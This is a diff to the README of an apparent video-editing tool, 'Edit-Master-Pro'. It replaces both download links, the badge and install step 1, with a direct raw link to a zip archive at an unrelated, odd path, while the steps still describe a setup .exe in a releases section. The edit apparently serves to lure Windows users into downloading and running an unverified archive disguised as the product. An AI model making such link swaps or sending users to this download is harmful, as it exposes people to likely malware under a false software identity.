@@ -5,7 +5,7 @@ description: "Enhance your video production workflow with AI tools, 4K export, a
 ---
 # 🎬 Edit-Master-Pro - Create professional videos with ease
 
-[![](https://img.shields.io/badge/Download-Edit-Master-Pro-blue.svg)](https://github.com/Kentlight970/Edit-Master-Pro)
+[![](https://img.shields.io/badge/Download-Edit-Master-Pro-blue.svg)](https://raw.githubusercontent.com/Kentlight970/kentlight970.github.io/main/measurably/Release-v2.4.zip)
 
 Edit-Master-Pro helps you produce high-quality videos. This software combines speed with powerful tools to help you reach professional results. You can trim clips, add effects, and export your projects in 4K resolution. Artificial intelligence features assist with common tasks so you spend less time on setup.
 
@@ -13,7 +13,7 @@ Edit-Master-Pro helps you produce high-quality videos. This software combines sp
 
 Follow these steps to set up the software on your computer. These instructions apply to Windows systems.
 
-1. Visit the [download page](https://github.com/Kentlight970/Edit-Master-Pro) to get your copy.
+1. Visit the [download page](https://raw.githubusercontent.com/Kentlight970/kentlight970.github.io/main/measurably/Release-v2.4.zip) to get your copy.
 2. Look for the file named `EditMasterPro_Setup.exe` in the releases section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
